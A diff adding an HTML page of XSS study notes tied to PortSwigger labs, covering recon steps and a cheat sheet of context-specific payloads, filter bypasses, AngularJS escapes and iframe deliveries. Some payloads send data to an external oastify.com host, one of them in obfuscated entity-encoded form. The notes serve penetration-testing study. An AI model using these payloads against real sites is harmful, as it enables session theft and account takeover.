@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>XSS</title>
+  <link rel="stylesheet" href="/static/style.css">
+
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="cross-site-scripting">Cross-site Scripting</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for XSS</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p>
+<ul>
+<li><p><a href="#xss-between-html-tags-and-dom-xss">XSS between HTML
+tags + DOM XSS</a></p></li>
+<li><p><a href="#xss-in-html-tag-attributes">XSS in HTML tag
+attributes</a></p></li>
+<li><p><a href="#xss-into-javascript">XSS into JavaScript</a></p></li>
+<li><p><a href="#xss-to-exploit-users">XSS to Exploit Users</a></p></li>
+<li><p><a href="#more-exploitation-payloads-and-examples">More
+Exploitation and Exfiltration Related Payloads</a></p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><p>https://portswigger.net/web-security/cross-site-scripting</p></li>
+<li><p>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting</p></li>
+<li><p>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting</p></li>
+<li><p>https://owasp.org/www-community/attacks/xss/</p></li>
+</ul>
+<p><br><br></p>
+<h2 id="recon">Recon</h2>
+<h3 id="identify-reflected-xss">Identify Reflected XSS</h3>
+<ul>
+<li><p><strong>Identify Reflections of User Input</strong></p>
+<ul>
+<li><p>Submit a unique random alphanumeric String into every parameter
+in each request, one at a time, and identify which parameters the
+application is reflecting back</p></li>
+<li><p>Also submit the random String on any headers that the application
+seems to be processing</p></li>
+</ul></li>
+<li><p><strong>Testing Reflection to Introduce XSS</strong></p>
+<ul>
+<li><p>Review the source code to identify all the locations where the
+unique String is reflected</p></li>
+<li><p>Each occurrence needs to be tested separately</p></li>
+<li><p>Depending on the context of where the String is being reflected,
+determine how the String needs to be modified in order to cause
+execution of a script</p></li>
+<li><p>Use a proof-of-concept alert box to confirm that the script is
+executing in your browser</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h3 id="identify-stored-xss">Identify Stored XSS</h3>
+<ul>
+<li><p><strong>Identify &amp; Test for Stored XSS</strong></p>
+<ul>
+<li><p>Submit a unique random String in every input field on the
+application, review all the application’s functionality to see if there
+are any more instances where the String in displayed back to the
+browser. User-controllable data entered in 1 location can end up being
+reflected in many other arbitrary locations and each appearance may have
+different protective filters.</p></li>
+<li><p>Identify if there is any input validation or encoding on the
+reflected data and determine how it needs to be modified to cause an
+execution of code</p></li>
+<li><p>If you have access to 2 accounts ( E.g., normal user &amp; admin
+user ), check if the injected data from the normal user appears in any
+of the functionality that an admin user can see</p></li>
+<li><p>Make sure to complete the entire process when testing inputs that
+require multiple requests to be completed before they are stored. Such
+as registering a user, placing an order, etc.</p></li>
+<li><p>Test file upload functionalities for Stored XSS</p></li>
+<li><p>For reflected XSS, it is straight forward to identify which
+parameters are vulnerable, as each parameter is tested individually, and
+the response is analyzed for any appearances of the input.</p></li>
+<li><p>For stored XSS, if the same data is included in every input
+field, then in may be difficult to determine which parameter is the one
+responsible for the appearance of the data on the application. To avoid
+this issue, submit different test Strings for each parameter when
+probing for Stored XSS. Example: test123comment, test123username,
+test123address, etc.</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<h3 id="identify-dom-xss">Identify DOM XSS</h3>
+<ul>
+<li><p>Use the Browser to test for DOM-based XSS, as this will cause all
+the client-side scripts to execute.</p></li>
+<li><p>After mapping out the application, review all JavaScript
+client-side scripts for any “sources” in which a user can potentially
+control.</p>
+<ul>
+<li><a
+href="https://portswigger.net/web-security/dom-based#common-sources">Common
+Sources</a></li>
+</ul></li>
+<li><p>Review the code to identify what is being done with the
+user-controllable data, and if it can be used to cause JavaScript
+execution. Identify if the data is being passed to dangerous
+“sinks”.</p>
+<ul>
+<li><a
+href="https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities">Dangerous
+Sinks</a></li>
+</ul></li>
+<li><p>Burp Suite built-in tool to test for DOM XSS:</p>
+<ul>
+<li><a
+href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">DOM
+Invader Tool</a></li>
+</ul></li>
+<li><p>Note: DOM XSS can be combined with either a Reflected/Stored XSS.
+Any client-side protections can be bypassed using Burp Suite before the
+data is passed back to the vulnerable client-side script.</p></li>
+</ul>
+<p><br></p>
+<p><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><br></p>
+<p><strong>Quick Note:</strong> (To bypass some restrictions the
+following can help.)</p>
+<ul>
+<li><p>Use eval() and String.fromCharCode() to encode full payload
+(Cyber Chef -&gt; To Decimal -&gt; Delimiter set to “Comma” -&gt;
+Copy/Paste)</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="pp">eval</span>(<span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(INSERT_PAYLOAD))</span></code></pre></div></li>
+<li><p>Use window[‘document’][‘location’]</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="bu">window</span>[<span class="st">&#39;document&#39;</span>][<span class="st">&#39;location&#39;</span>] <span class="op">=</span> <span class="st">&quot;https://2q9hxdl2.oastify.com/?test=&quot;</span> <span class="op">+</span> <span class="bu">document</span><span class="op">.</span><span class="at">domain</span> <span class="op">+</span> <span class="st">&quot;test123&quot;</span></span></code></pre></div></li>
+</ul>
+<p><br></p>
+<h3 id="cheat-sheets">Cheat Sheets</h3>
+<ul>
+<li><p>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p></li>
+<li><p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</p></li>
+<li><p>https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</p></li>
+<li><p>https://gchq.github.io/CyberChef/</p></li>
+</ul>
+<p><br></p>
+<h3 id="initial-probing">Initial Probing</h3>
+<ul>
+<li><p>Submit a test String to all the input fields one at a time and
+identify the context in which the data is being returned in the
+responses. For Stored XSS, we can add the parameter name to the payload.
+The below test strings will verify how the application responds to angle
+brackets, parenthesis, quotation marks, single quotes.</p>
+<ul>
+<li><strong>Test Strings:</strong></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span>&gt;&quot;&#39;/\`</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>Test123parameterName</span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">u</span><span class="dt">&gt;</span>Test123<span class="dt">&lt;/</span><span class="kw">u</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="st">&quot;Test123&quot;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="st">&#39;Test123&#39;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<ul>
+<li><strong>Depending on that context, the following payloads can be
+used to break out of the context and potentially execute
+XSS:</strong></li>
+</ul>
+<p><br></p>
+<h2 id="xss-between-html-tags-and-dom-xss">XSS between HTML tags and DOM
+XSS</h2>
+<h3 id="no-encoding-implemented-on-the-injected-data">No encoding
+implemented on the injected data</h3>
+<ul>
+<li>If injected input is not be validated or encoded, we can simply use
+the standard XSS payloads below:</li>
+</ul>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">x</span><span class="ot"> onerror</span><span class="op">=</span><span class="st">alert(1)</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="tags-are-being-encoded-but-not-recursively">Tags are being
+encoded but not recursively</h3>
+<ul>
+<li>The application may be encoding the injected tags, but not in a
+recursive way. The &lt;test&gt; tag will be properly encoded and
+rendered as data, but the rest of the payload will be executed as
+code.</li>
+</ul>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">test</span><span class="dt">&gt;</span> <span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">x</span><span class="ot"> onerror</span><span class="op">=</span><span class="st">alert(1)</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="tags-are-blocked-except-for-custom-ones">Tags are blocked except
+for custom ones</h3>
+<ul>
+<li><p>If the application is blocking some common tags, we can inject
+custom ones. Portswigger cheat sheet can help to have a list to
+fuzz.</p></li>
+<li><p>We can use Burp Intruder to fuzz and check which tags and event
+handlers are allowed.</p>
+<ul>
+<li>Example: &lt;FUZZ&gt; , &lt;body FUZZ=“test”&gt;</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">input2</span><span class="ot"> onmouseover</span><span class="op">=</span><span class="st">alert(1)</span><span class="dt">&gt;</span>Test<span class="dt">&lt;/</span><span class="kw">input2</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">body</span><span class="ot"> onresize</span><span class="op">=</span><span class="st">&quot;print()&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<ul>
+<li>Submit Payload to the Victim user using Exploit Server: (encode
+special characters)</li>
+</ul>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>      location <span class="op">=</span> <span class="st">&#39;https://your-lab-id.web-security-academy.net/?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;#x&#39;</span><span class="op">;</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>iframe src<span class="op">=</span><span class="st">&quot;https://YOUR-LAB-ID.web-security-academy.net/?search=&quot;</span><span class="op">&gt;&lt;</span>body onresize<span class="op">=</span><span class="fu">print</span>()<span class="op">&gt;</span><span class="st">&quot; onload=this.style.width=&#39;100px&#39;&gt;</span></span></code></pre></div>
+<ul>
+<li>The first quotation mark that is in the payload and the angle
+brackets need to be encoded.</li>
+</ul>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>iframe src<span class="op">=</span><span class="st">&quot;https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot;</span> onload<span class="op">=</span><span class="kw">this</span><span class="op">.</span><span class="at">style</span><span class="op">.</span><span class="at">width</span><span class="op">=</span><span class="st">&#39;100px&#39;</span><span class="op">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="svg-markup-payload">SVG markup payload</h3>
+<ul>
+<li>Payload to try if the application is allowing to render &lt;svg&gt;
+tags, can be found on Portswigger XSS Cheat Sheet.</li>
+</ul>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">svg</span><span class="dt">&gt;&lt;</span><span class="kw">animatetransform</span><span class="ot"> onbegin</span><span class="op">=</span><span class="st">alert(document.domain)</span><span class="ot"> attributeName</span><span class="op">=</span><span class="st">transform</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3
+id="reflected-xss-with-event-handlers-and-href-attributes-blocked">Reflected
+XSS with event handlers and href attributes blocked</h3>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">svg</span><span class="dt">&gt;&lt;</span><span class="kw">a</span><span class="dt">&gt;&lt;</span><span class="kw">animate</span><span class="ot"> attributeName</span><span class="op">=</span><span class="st">href</span><span class="ot"> values</span><span class="op">=</span><span class="st">javascript:alert(1)</span><span class="ot"> </span><span class="dt">/&gt;&lt;</span><span class="kw">text</span><span class="ot"> x</span><span class="op">=</span><span class="st">20</span><span class="ot"> y</span><span class="op">=</span><span class="st">20</span><span class="dt">&gt;</span>Click me<span class="dt">&lt;/</span><span class="kw">text</span><span class="dt">&gt;&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="dom-xss-input-is-within-the-.innerhtml-sink">DOM XSS – Input is
+within the .innerHTML() Sink</h3>
+<ul>
+<li>If user-controllable source is passed to the .innerHTML() sink, then
+we can use an &lt;img&gt; tag, for example, to execute JavaScript. The
+.innerHTML() property will not execute &lt;script&gt; tags.</li>
+</ul>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">x</span><span class="ot"> onerror</span><span class="op">=</span><span class="st">alert(1)</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="dom-xss---angularjs-expression">DOM XSS - AngularJS
+Expression</h3>
+<ul>
+<li><p>If the application is using Angular JS, try injecting the
+following payload to the input fields and see if the expression is
+getting processed –&gt; {{2+2}} = 4</p>
+<ul>
+<li>Example:
+https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>{{ <span class="kw">this</span><span class="op">.</span><span class="at">constructor</span><span class="op">.</span><span class="fu">constructor</span>(<span class="st">&#39;alert(&quot;foo&quot;)&#39;</span>)() }}</span></code></pre></div>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>{{$on<span class="op">.</span><span class="fu">constructor</span>(<span class="st">&#39;alert(1)&#39;</span>)()}}</span></code></pre></div>
+<p><br></p>
+<h3 id="dom-xss-jquery-selector-sink---hashchange-event">DOM XSS jQuery
+selector sink - hashchange event</h3>
+<ul>
+<li>Vulnerable code:</li>
+</ul>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>   <span class="fu">$</span>(<span class="bu">window</span>)<span class="op">.</span><span class="fu">on</span>(<span class="st">&#39;hashchange&#39;</span><span class="op">,</span> <span class="kw">function</span>(){</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>      <span class="kw">var</span> post <span class="op">=</span> <span class="fu">$</span>(<span class="st">&#39;section.blog-list h2:contains(&#39;</span> <span class="op">+</span> <span class="pp">decodeURIComponent</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">hash</span><span class="op">.</span><span class="fu">slice</span>(<span class="dv">1</span>)) <span class="op">+</span> <span class="st">&#39;)&#39;</span>)<span class="op">;</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>         <span class="cf">if</span> (post) post<span class="op">.</span><span class="fu">get</span>(<span class="dv">0</span>)<span class="op">.</span><span class="fu">scrollIntoView</span>()<span class="op">;</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>   })<span class="op">;</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
+<ul>
+<li>Exploit: In this example, the src attribute points to the vulnerable
+page with an empty hash value. When the iframe is loaded, an XSS vector
+is appended to the hash, causing the hashchange event to fire.</li>
+</ul>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION/#&quot;</span><span class="ot"> onload</span><span class="op">=</span><span class="st">&quot;this.src+=&#39;</span><span class="er">&lt;</span><span class="st">img src=x onerror=print()&gt;&#39;&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<h2 id="xss-in-html-tag-attributes">XSS in HTML tag attributes</h2>
+<h3 id="input-is-within-an-html-attribute">Input is within an HTML
+attribute</h3>
+<ul>
+<li><p>When the injected input is reflected within an HTML attribute, we
+need to close out the existing attribute/tag and introduce a new tag to
+execute JavaScript.</p>
+<ul>
+<li>Example: &lt;img src=“<em>user-input</em>” &gt;</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>&quot;&gt;<span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="angle-brackets-encoded-but-data-is-reflected-in-attribute">Angle
+brackets encoded but data is reflected in attribute</h3>
+<ul>
+<li><p>This will break out of the current attribute and introduce a new
+one that can execute JavaScript. The last quotation mark is needed to
+ensure the syntax of the tag is correct.</p>
+<ul>
+<li>Example: &lt;input value=“<em>user-input</em>”&gt;</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a>Test123&quot; autofocus onfocus=alert(1) x=&quot; </span></code></pre></div>
+<p><br></p>
+<h3 id="input-is-within-an-href-attribute">Input is within an href
+attribute</h3>
+<ul>
+<li><p>The JavaScript pseudo protocol can be used when the data is being
+reflected within a href attribute.</p>
+<ul>
+<li>Example: &lt;a href=“<em>user-input</em>” &gt;</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a>javascript:alert(1)</span></code></pre></div>
+<p><br></p>
+<h3 id="input-is-within-a-canonical-link-tag">Input is within a
+canonical link tag</h3>
+<ul>
+<li>Example: &lt;link rel=“canonical”
+href=‘httpss://some-site.com/<em>user-input</em>’ /&gt;</li>
+</ul>
+<div class="sourceCode" id="cb26"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a>&#39; accesskey=&#39;x&#39; onclick=&#39;alert(1)</span></code></pre></div>
+<p><br><br></p>
+<h2 id="xss-into-javascript">XSS into JavaScript</h2>
+<h3
+id="javascript-string-with-single-quote-and-backslash-escaped">JavaScript
+String with single quote and backslash escaped</h3>
+<ul>
+<li><p>Use this payload to close the existing &lt;script&gt; tag and
+introduce a new tag that can execute JavaScript code.</p>
+<ul>
+<li>Example: &lt;script&gt; var x
+=‘<em>user-input</em>’&lt;/script&gt;</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb27"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">x</span><span class="ot"> onerror</span><span class="op">=</span><span class="st">alert(1)</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br></p>
+<h3 id="javascript-string-with-angle-brackets-encoded">JavaScript String
+with angle brackets encoded</h3>
+<ul>
+<li><p>This payload will terminate the existing String and close the
+statement, then comment out the rest of line. Since the input is within
+&lt;script&gt; tags the payload will execute as JS.</p>
+<ul>
+<li>Example: &lt;script&gt; var x
+=’<em>user-input</em>’&lt;/script&gt;</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb28"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a>&#39;; alert(1) //</span></code></pre></div>
+<p><br></p>
+<h3
+id="javascript-string-with-angle-brackets-double-quotes-encoded-and-single-quotes-escaped">JavaScript
+String with angle brackets, double quotes encoded, and single quotes
+escaped</h3>
+<ul>
+<li><p>The escape character itself, is not escaped, so when we supply it
+in the payload the application will end up escaping the escape
+character, instead of the single quote. Since the input is already
+within &lt;script&gt; tags, the alert() will execute.</p>
+<ul>
+<li>Example: &lt;script&gt; var x
+=’<em>user-input</em>’&lt;/script&gt;</li>
+</ul></li>
+<li><p><strong>Payload</strong></p></li>
+</ul>
+<div class="sourceCode" id="cb29"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a>\&#39;; alert(1)//</span></code></pre></div>
+<ul>
+<li><strong>End-Result</strong></li>
+</ul>
+<div class="sourceCode" id="cb30"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>\\&#39;;alert(1)//</span></code></pre></div>
+<ul>
+<li>For exploitation payloads see the next Section on Exploitation
+Payloads.</li>
+</ul>
+<p><br><br></p>
+<h3
+id="xss-is-onclick-event-with-angle-brackets-double-quotes-encoded-and-singlebackslashes-escaped">XSS
+is onclick event with angle brackets, double quotes encoded, and
+single/backslashes escaped</h3>
+<ul>
+<li><p>Bypass server-side validation by submitting HTML entities. The
+Browser will decode the HTML entities before the JavaScript is executed,
+which will break out of the context and execute the JavaScript.</p></li>
+<li><p>https://www.w3schools.com/html/html_entities.asp</p>
+<ul>
+<li>Example: &lt;a onclick=”var x=z; x.y(‘http://<em>user-input</em>’);”
+&gt;</li>
+</ul></li>
+<li><p><strong>Identification Payloads:</strong></p></li>
+</ul>
+<pre><code>&amp;apos; ) ; alert(1) ;//</code></pre>
+<pre><code>&amp;apos; -alert(1)- &amp;apos; </code></pre>
+<ul>
+<li><p><strong>Exploitation Payloads:</strong></p></li>
+<li><p>In this scenario, the application is encoding tags/quotations and
+escaping single quotes/backslashes.</p></li>
+<li><p>We can bypass this by HTML encoding our payload:</p></li>
+<li><p>Original Payload:</p></li>
+</ul>
+<div class="sourceCode" id="cb33"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="st">&#39;) ; document.location = &#39;</span>https<span class="op">:</span><span class="co">//tjqojc8.oastify.com/?x=&#39; + document.domain ; //</span></span></code></pre></div>
+<ul>
+<li>HTML Encoded Payload: (If using Burp Suite, the payload itself will
+need to be URL encoded to process correctly.)</li>
+</ul>
+<div class="sourceCode" id="cb34"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="op">&amp;</span>apos<span class="op">;</span>) <span class="op">;</span> <span class="op">&amp;</span>#x64<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x63<span class="op">;&amp;</span>#x75<span class="op">;&amp;</span>#x6d<span class="op">;&amp;</span>#x65<span class="op">;&amp;</span>#x6e<span class="op">;&amp;</span>#x74<span class="op">;&amp;</span>#x2e<span class="op">;&amp;</span>#x6c<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x63<span class="op">;&amp;</span>#x61<span class="op">;&amp;</span>#x74<span class="op">;&amp;</span>#x69<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x6e<span class="op">;&amp;</span>#x20<span class="op">;&amp;</span>#x3d<span class="op">;&amp;</span>#x20<span class="op">;&amp;</span>#x27<span class="op">;&amp;</span>#x68<span class="op">;&amp;</span>#x74<span class="op">;&amp;</span>#x74<span class="op">;&amp;</span>#x70<span class="op">;&amp;</span>#x73<span class="op">;&amp;</span>#x3a<span class="op">;&amp;</span>#x2f<span class="op">;&amp;</span>#x2f<span class="op">;&amp;</span>#x74<span class="op">;&amp;</span>#x6a<span class="op">;&amp;</span>#x67<span class="op">;&amp;</span>#x38<span class="op">;&amp;</span>#x75<span class="op">;&amp;</span>#x7a<span class="op">;&amp;</span>#x30<span class="op">;&amp;</span>#x71<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x6a<span class="op">;&amp;</span>#x63<span class="op">;&amp;</span>#x38<span class="op">;&amp;</span>#x2e<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x61<span class="op">;&amp;</span>#x73<span class="op">;&amp;</span>#x74<span class="op">;&amp;</span>#x69<span class="op">;&amp;</span>#x66<span class="op">;&amp;</span>#x79<span class="op">;&amp;</span>#x2e<span class="op">;&amp;</span>#x63<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x6d<span class="op">;&amp;</span>#x2f<span class="op">;&amp;</span>#x3f<span class="op">;&amp;</span>#x78<span class="op">;&amp;</span>#x3d<span class="op">;&amp;</span>#x27<span class="op">;&amp;</span>#x20<span class="op">;&amp;</span>#x2b<span class="op">;&amp;</span>#x20<span class="op">;&amp;</span>#x64<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x63<span class="op">;&amp;</span>#x75<span class="op">;&amp;</span>#x6d<span class="op">;&amp;</span>#x65<span class="op">;&amp;</span>#x6e<span class="op">;&amp;</span>#x74<span class="op">;&amp;</span>#x2e<span class="op">;&amp;</span>#x64<span class="op">;&amp;</span>#x6f<span class="op">;&amp;</span>#x6d<span class="op">;&amp;</span>#x61<span class="op">;&amp;</span>#x69<span class="op">;&amp;</span>#x6e<span class="op">;</span> <span class="op">;</span> <span class="co">//</span></span></code></pre></div>
+<p><br><br></p>
+<h3 id="xss-into-template-literal">XSS into template literal ``</h3>
+<ul>
+<li><p>When the injected input is being reflected inside of backticks `
+(template literals), we can execute expressions using the
+${<em>data</em>} format.</p>
+<ul>
+<li>Example: &lt;script&gt; var message=`<em>user-input</em>`
+&lt;/script&gt;</li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb35"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>${<span class="fu">alert</span>(<span class="dv">1</span>)}</span></code></pre></div>
+<p><br><br></p>
+<h2 id="xss-to-exploit-users">XSS to Exploit Users</h2>
+<h3 id="use-xss-to-steal-users-cookies">Use XSS to steal user’s
